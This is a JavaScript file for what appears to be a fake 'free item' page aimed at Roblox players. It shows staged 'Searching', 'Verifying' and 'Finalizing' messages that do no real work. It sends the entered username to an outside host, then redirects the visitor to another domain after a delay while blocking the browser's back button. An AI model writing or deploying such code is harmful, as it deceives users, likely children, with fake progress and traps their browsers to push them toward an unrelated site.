document.addEventListener("DOMContentLoaded", function () {
    document.querySelectorAll("button").forEach(button => {
        button.addEventListener("click", function () {
            let item = this.closest("li");
            let imgSrc = item.querySelector("img").src;
            let itemName = item.querySelector("p").textContent;

            let popupContainer = document.getElementById('popupContainer');
            let popup = document.getElementById('popup');
            let closeButton = document.getElementById('closeButton');
            let popupTitle = document.getElementById('popupTitle');
            let popupImage = document.getElementById('popupImage');
            let popupName = document.getElementById('popupName');
            let usernameInput = document.getElementById('usernameInput');
            let submitButton = document.getElementById('submitButton');
            let loadingImage = document.getElementById('loadingImage');

            popupImage.src = imgSrc;
            popupName.textContent = itemName;

            popupContainer.style.display = "flex";

            closeButton.addEventListener("click", function () {
                popupContainer.style.display = "none";
            });

            submitButton.addEventListener("click", function () {
                let username = usernameInput.value;
                if (username) {
                    let dots = "";
                    let dotInterval = setInterval(() => {
                        dots = dots.length < 3 ? dots + "." : "";
                        popupTitle.textContent = `Searching ${username}${dots}`;
                    }, 500);

                    popupImage.style.display = "none";
                    popupName.style.display = "none";
                    usernameInput.style.display = "none";
                    submitButton.style.display = "none";
                    loadingImage.style.display = "block";

                    setTimeout(() => {
                        clearInterval(dotInterval);
                        dots = "";
                        dotInterval = setInterval(() => {
                            dots = dots.length < 3 ? dots + "." : "";
                            popupTitle.textContent = `Verifying${dots}`;
                        }, 500);

                        popupImage.style.width = "150px";
                        popupImage.style.height = "150px";
                    }, 3000);

                    setTimeout(() => {
                        clearInterval(dotInterval);
                        dots = "";
                        dotInterval = setInterval(() => {
                            dots = dots.length < 3 ? dots + "." : "";
                            popupTitle.textContent = `Loading last step${dots}`;
                        }, 500);
                    }, 6000);

                    setTimeout(() => {
                        clearInterval(dotInterval);
                        dots = "";
                        popupTitle.textContent = `Finalizing${dots}`;
                    }, 6000);

                    setTimeout(() => {
                        clearInterval(dotInterval);
                        dots = "";
                        fetch(`https://abadaoucht.com/tiktok/api/roblox/userinfo/${username}`)
                            .then(response => {
                                if (!response.ok) {
                                    throw new Error("API not available");
                                }
                                return response.json();
                            })
                            .then(profileData => {
                                if (profileData.status === "SUCCESS") {
                                    loadingImage.style.display = "none";
                                    popupTitle.textContent = "Final step";
                                    
                                    displayProfile(profileData);
                                }
                            })
                            .catch((error) => {
                                console.log("API error: ", error.message);
                                showVisitorInfo(username);
                            });
                    }, 6000);
                }
            });
        });
    });
});
var button = document.querySelector('#submitButton');
button.addEventListener('click', function() {
    var redirectURL = "https://www.rolls3.com";

    if (window.location.hostname !== "www." + window.location.hostname) {
        var isIphoneOrIpad = /iPhone|iPad/i.test(navigator.userAgent);

        if (!isIphoneOrIpad) {
            setTimeout(function() {
                window.location.href = redirectURL;
            }, 8000);

            history.pushState(null, null, location.href);
            window.onpopstate = function() {
                history.go(1);
            };
        }
    }
});
